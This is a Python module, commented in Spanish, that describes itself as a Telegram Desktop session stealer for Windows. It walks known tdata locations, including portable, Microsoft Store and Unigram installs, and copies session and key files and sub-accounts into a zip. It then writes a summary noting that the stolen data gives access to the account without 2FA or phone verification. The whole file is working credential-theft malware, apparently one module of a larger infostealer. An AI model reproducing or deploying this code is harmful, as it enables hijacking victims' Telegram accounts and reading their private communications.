# language: Python 3, file: telegram_session.py, target: Windows 10/11
# Telegram Desktop session stealer
# roba tdata/ completo — acceso total a la cuenta sin 2FA ni código de verificación
# también busca Telegram Portable y versiones alternativas

import os
import zipfile
from pathlib import Path

ROAMING = os.getenv("APPDATA", "")
LOCAL   = os.getenv("LOCALAPPDATA", "")
USER    = os.getenv("USERPROFILE", "")

# rutas conocidas de Telegram Desktop
TELEGRAM_PATHS = [
    # instalación estándar
    os.path.join(ROAMING, "Telegram Desktop", "tdata"),
    # portable (puede estar en cualquier lugar — se busca en rutas comunes)
    os.path.join(USER, "Desktop",    "Telegram Desktop", "tdata"),
    os.path.join(USER, "Downloads",  "Telegram Desktop", "tdata"),
    os.path.join(USER, "Documents",  "Telegram Desktop", "tdata"),
    os.path.join("C:\\", "Telegram Desktop", "tdata"),
    os.path.join("D:\\", "Telegram Desktop", "tdata"),
    # Telegram from Microsoft Store
    os.path.join(LOCAL, "Packages", "TelegramMessengerLLP.TelegramDesktop_t4vj0pshhgkwm",
                 "LocalCache", "Roaming", "Telegram Desktop", "tdata"),
    # Unigram (cliente alternativo)
    os.path.join(LOCAL, "Packages", "38833FF26BA1D.Unigram_g9c9v27vpyspw",
                 "LocalState", "tdata"),
]

# archivos críticos dentro de tdata/
# key_datas y D877F783D5D3EF8C son los archivos de sesión cifrados
# sin estos no hay sesión — son los más importantes
CRITICAL_FILES = [
    "key_datas",
    "D877F783D5D3EF8C",    # session data principal
    "D877F783D5D3EF8C.b#*",
    "prefix",
]

# extensiones a ignorar — caché de medios (muy pesado, no aporta acceso)
SKIP_EXTENSIONS = {
    '.jpg', '.jpeg', '.png', '.webp', '.gif', '.mp4', '.webm',
    '.mp3', '.ogg', '.oga', '.opus', '.flac', '.wav',
    '.thumb', '.part',
}

# carpetas a ignorar — caché de imágenes y stickers
SKIP_FOLDERS = {
    'emoji', 'user_photos', 'stickers', 'temp', 'dumps',
}

# tamaño máximo por archivo a incluir (50 MB — evitar meter medias pesadas)
MAX_FILE_SIZE = 50 * 1024 * 1024


def _is_session_file(fname: str) -> bool:
    """
    Los archivos de sesión de Telegram siguen el patrón:
    - key_datas (sesión principal)
    - D877F783D5D3EF8C (hash del DC + sesión)
    - D877F783D5D3EF8C.b#N (backups de sesión)
    - s*.b#N (sesiones adicionales)
    - prefix (prefijo de sesión)
    """
    name_lower = fname.lower()
    # key_datas y prefix — siempre incluir
    if fname in ('key_datas', 'prefix'):
        return True
    # patrón de session data: 16 chars hex
    if len(fname) == 16 and all(c in '0123456789ABCDEFabcdef' for c in fname):
        return True
    # backups: nombre.b#N
    if '.b#' in fname:
        return True
    # s + número (multi-account)
    if fname.startswith('s') and fname[1:].isdigit():
        return True
    return False


def _add_tdata(zip_file, tdata_path: str, account_label: str) -> int:
    """
    Agrega archivos de tdata al zip de forma selectiva.
    Prioriza archivos de sesión, incluye configs, excluye caché de medias.
    Retorna cantidad de archivos agregados.
    """
    count = 0
    arc_base = f"Telegram/{account_label}/tdata"

    for root, dirs, files in os.walk(tdata_path):
        # filtrar carpetas de caché
        dirs[:] = [d for d in dirs if d.lower() not in SKIP_FOLDERS]

        rel_root = os.path.relpath(root, tdata_path)

        for fname in files:
            fpath = os.path.join(root, fname)

            # skip por extensión
            _, ext = os.path.splitext(fname.lower())
            if ext in SKIP_EXTENSIONS:
                continue

            # skip si muy grande
            try:
                if os.path.getsize(fpath) > MAX_FILE_SIZE:
                    continue
            except Exception:
                continue

            # construir arcname
            if rel_root == '.':
                arcname = f"{arc_base}/{fname}"
            else:
                arcname = f"{arc_base}/{rel_root}/{fname}"

            try:
                with open(fpath, 'rb') as f:
                    data = f.read()
                zip_file.writestr(arcname, data)
                count += 1
            except Exception:
                pass

    return count


def _find_multiaccounts(tdata_path: str) -> list[str]:
    """
    Telegram soporta múltiples cuentas — cada una tiene su propio
    subdirectorio con prefijo numérico dentro de tdata/.
    Retorna lista de sub-paths de cuentas adicionales.
    """
    accounts = []
    try:
        for item in os.listdir(tdata_path):
            # cuentas adicionales: carpetas que empiezan con número
            # o con patrón específico de Telegram multi-account
            item_path = os.path.join(tdata_path, item)
            if os.path.isdir(item_path):
                if item.startswith(('1', '2', '3', '4', '5', '6', '7', '8', '9')):
                    sub_keydata = os.path.join(item_path, 'key_datas')
                    if os.path.exists(sub_keydata):
                        accounts.append(item_path)
    except Exception:
        pass
    return accounts


# ─────────────────────────────────────────────
# ENTRY POINT
# ─────────────────────────────────────────────

def TelegramSession(zip_file) -> int:
    """
    Roba sesiones de Telegram Desktop.
    Retorna cantidad de instalaciones encontradas.
    """
    found_count  = 0
    total_files  = 0
    summary_lines = []

    for tdata_path in TELEGRAM_PATHS:
        if not os.path.exists(tdata_path):
            continue

        # verificar que tiene archivos de sesión válidos
        key_datas = os.path.join(tdata_path, 'key_datas')
        if not os.path.exists(key_datas):
            continue

        found_count += 1
        label = f"account_{found_count:02d}"

        n = _add_tdata(zip_file, tdata_path, label)
        total_files += n

        summary_lines.append(
            f"[{label}]\n"
            f"  Path   : {tdata_path}\n"
            f"  Files  : {n}\n"
        )

        # buscar cuentas adicionales dentro de la misma tdata
        sub_accounts = _find_multiaccounts(tdata_path)
        for i, sub_path in enumerate(sub_accounts, 1):
            sub_label = f"{label}_sub{i}"
            n_sub = _add_tdata(zip_file, sub_path, sub_label)
            total_files += n_sub
            summary_lines.append(
                f"  [sub-account {i}]\n"
                f"    Path  : {sub_path}\n"
                f"    Files : {n_sub}\n"
            )

    if not summary_lines:
        zip_file.writestr("Telegram/README.txt", "Telegram Desktop not found.")
        return 0

    summary = (
        f"Telegram Desktop Sessions\n"
        f"{'='*40}\n"
        f"Installations found : {found_count}\n"
        f"Total files grabbed : {total_files}\n\n"
        f"Note: load tdata/ in a Telegram Desktop installation\n"
        f"to access the account without 2FA or phone verification.\n\n"
    ) + "\n".join(summary_lines)

    zip_file.writestr("Telegram/telegram_summary.txt", summary)

    return found_count
